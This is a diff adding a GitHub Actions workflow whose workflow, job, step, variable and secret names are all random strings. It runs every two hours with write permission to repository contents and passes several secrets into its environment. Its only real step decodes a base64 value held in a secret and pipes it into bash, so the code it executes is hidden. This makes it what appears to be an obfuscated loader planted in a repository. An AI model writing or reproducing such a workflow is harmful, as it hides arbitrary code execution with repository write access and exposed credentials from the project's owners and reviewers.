@@ -1,0 +1,21 @@
+name: VdSIZ
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  lKsYMMG7xnJltSBZ:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          token: ${{ secrets.Dr0e5v }}
+      - name: qfImznm2WpL4ig
+        env:
+          c96dr4e7: ${{ secrets.VKQmaTH }}
+          gHUELTRLx89u55: ${{ secrets.Xo6hR4Lg }}
+          Dres24p1g: ${{ secrets.wS02S1t201 }}
+          GITHUB_TOKEN: ${{ secrets.Dr0e5v }}
+        run: echo "$c96dr4e7" | base64 -d | bash
